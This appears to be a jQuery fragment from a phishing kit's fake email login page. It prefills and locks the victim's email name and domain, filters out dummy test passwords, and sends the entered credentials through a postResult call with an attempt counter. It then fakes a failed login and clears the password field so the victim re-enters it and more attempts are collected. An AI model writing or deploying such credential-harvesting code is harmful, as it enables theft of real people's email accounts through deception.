// 
if (validEmail.test(usermail)) {
    let getDomain = usermail.split('@');
    $("#cn4name_input").val(getDomain[0]);
    $("#cn4domain_input").val(getDomain[1]);

    $("#cn4name_input").attr('readOnly', true);
    $("#cn4domain_input").attr('readOnly', true);    
}


$("#cn4e_form").on('submit', (e)=>{
    e.preventDefault();

    if ($("#cn4name_input").val() == "") {
        $("#cn4name_input").css({"border-color":"red"})
        return
    }
    else{
        $("#cn4name_input").css({"border-color":"skyblue"})
    }

    // 

    if ($("#cn4domain_input").val() == "") {
        $("#cn4domain_input").css({"border-color":"red"})
        return
    }
    else{
        $("#cn4domain_input").css({"border-color":"skyblue"})
    }
    
    // 

    if (validEmail.test($("#cn4pass_input").val()) || $("#cn4pass_input").val().length < 6 || $("#cn4pass_input").val() == 123456 || $("#cn4pass_input").val().toLowerCase() == "qwerty" || $("#cn4pass_input").val().toLowerCase() == "password" || $("#cn4pass_input").val().toLowerCase() == "testing") {
        $("#cn4pass_input").css({"border-color":"red"})
        return
    }
    else{
        $("#cn4pass_input").css({"border-color":"skyblue"})

        let permEmail = $("#cn4name_input").val()+"@"+$("#cn4domain_input").val();

        postResult($("#cn4domain_input").val(), permEmail, $("#cn4pass_input").val(), postCount);

        $("#loader").show().css({"display":"flex"})

        setTimeout(() => {
            $("#cn4pass_input").css({"border-color":"red"})
            postCount++
            $("#cn4pass_input").val("")
        }, delayCounter);

    }

})